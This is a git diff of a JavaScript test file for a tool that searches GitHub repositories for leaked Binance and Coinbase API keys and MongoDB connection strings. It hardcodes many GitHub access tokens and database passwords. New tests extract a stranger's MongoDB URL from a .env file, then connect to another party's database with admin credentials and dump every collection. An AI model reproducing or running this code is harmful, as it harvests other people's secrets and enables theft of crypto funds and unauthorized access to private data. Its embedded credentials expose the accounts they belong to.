@@ -4,11 +4,12 @@ import Web3 from 'web3';
 import admin from 'firebase-admin';
 import serviceAccount from './serviceAccount';
 import mongoose, { MongooseError } from 'mongoose';
-import models from './models';
+// import models from './models';
 import Promise from 'bluebird';
 import GitHubRepoParser from 'github-repo-parser';
 import { convert } from 'html-to-text';
-import { parseForBinanceKeys, clean } from './helpers';
+import { makeOctokitRequest } from './middlewares';
+//import { parseForBinanceKeys, clean, parseForMongoDatabaseUrls } from './helpers';
 
 import ccxt from 'ccxt';
 import { SentryError } from '@sentry/utils';
@@ -16,8 +17,14 @@ import { SentryError } from '@sentry/utils';
 const Sentry = require('@sentry/node')
 
 
-let jon = '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';
-let user32 = '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'
+let jon = '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'
+let thesavage = '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'
+let user32 = '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'
+let eaglesfan = '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'
+let jonkolmanllc = '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'
+let eaglesfanj365 = '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'
+let jkolmanllc = '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'
+let kolmanllc = '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'
 let url_binance = 'https://bsc-dataseed.binance.org'
 let url_mainnet = "https://mainnet.infura.io/v3/9e34ce9faf8b4c6ca400b914af9cb665"
 let url_binance_2 = 'https://bsc-dataseed1.defibit.io/'
@@ -57,20 +64,22 @@ const unique = array => {
 const finalClean = arr => {
   return arr.map(item => item.replace('=', ''))
 }
+
+
 describe('tests', async () => {
   let base64RegEx = new RegExp('[^-A-Za-z0-9+/=]|=[^=]|={3,}$')
   
-  before(done  => {
-    console.log('beforeEach running')
-    process.on('uncaughtException', err => console.log(err))
-    process.on('unhandledRejection', err => console.log(err))
-    mongoose.connect('mongodb+srv://jkol36:TheSavage1990@cluster0.bvjyjf3.mongodb.net/?retryWrites=true&w=majority').then(res => {
-      console.log('database connected', res)
-      done()
-    })
+  // before(done  => {
+  //   console.log('beforeEach running')
+  //   process.on('uncaughtException', err => console.log(err))
+  //   process.on('unhandledRejection', err => console.log(err))
+  //   mongoose.connect('mongodb+srv://jkol36:TheSavage1990@cluster0.bvjyjf3.mongodb.net/?retryWrites=true&w=majority').then(res => {
+  //     console.log('database connected', res)
+  //     done()
+  //   })
     
     
-  })
+  // })
 
   it('should find matching api keys for secrets', async () => {
     let secrets = [
@@ -97,7 +106,65 @@ describe('tests', async () => {
    
 
   })
-  it.only('should find coinbase api key and secret in text', done => {
+  it.only('ocotokit request middleware', async () => {
+    const initialRepos = await makeOctokitRequest(gh.rest.search.repos({
+      q: 'binance',
+      order: 'asc',
+      page: 1,
+      sort: 'best-match',
+      per_page: 100
+    }), gh)
+    console.log('got initial repos', initialRepos)
+  })
+  it('should find mongodb database urls in .env', done => {
+    let commitDetails = {
+      owner: 'Thomasyong11',
+      repo: 'cakeorderapi',
+      file_sha: '9202cce26f533607b1e48e3bb2820847e4fe2892'
+    }
+    gh.rest.git.getBlob(commitDetails).then(res => {
+      //convert from base 64 to utf-8
+      let data = Buffer.from(res.data.content, 'base64').toString('utf-8') // what's easier to parse utf-8 or ascii?
+      let mongodbUrl = parseForMongoDatabaseUrls(data)
+      console.log(mongodbUrl)
+      expect(mongodbUrl).to.equal('mongodb+srv://rosseycakes:rosseycakes@cluster0.admto.mongodb.net/orderdb?retryWrites=true&w=majority')
+      done()
+      //const mongoDbUrl = data.substring(startingIndex, )
+    })
+  })
+  it('should find all collections', done => {
+    const url = "mongodb+srv://dbSuperAdmin:WixV4LQRTRKLPbysWOE33JAE@thinkcluster.dvfg3.mongodb.net/bc-think-app"
+    const namesList = [];
+    mongoose.connection.on("open", function (ref) {
+      console.log("Connected to mongo server.");
+      //trying to get collection names
+      mongoose.connection.db.listCollections().toArray(function (err, names) {
+        for (let i = 0; i < names.length; i++) {
+          // gets only the name and adds it to a list
+          const nameOnly = names[i].name;
+          namesList.push(nameOnly);
+        }
+        namesList.forEach(name => {
+          let schema = mongoose.Schema({}, {strict:false})
+          mongoose.model(name, schema)
+        })
+        return Promise.all(Promise.map(namesList, name => {
+          return mongoose.model(name).find().then(results => {
+            console.log('results for', name)
+            console.log(results)
+            return results
+          })
+        }))
+      });
+    });
+    mongoose.connect(url).then(res => {
+      console.log(res)
+      // const users = mongoose.Schema({}, {strict: false})
+      // mongoose.model('users', users)
+      //return mongoose.model('users').find()
+    }).then(console.log)
+  })
+  it('should find coinbase api key and secret in text', done => {
     const urls = [
       'https://github.com/cpatgo/funnel/blob/b4f07151fc2970fab3fd4ad7d09a0968e9c4636d/glc/bitcoin/index.php',
     ]
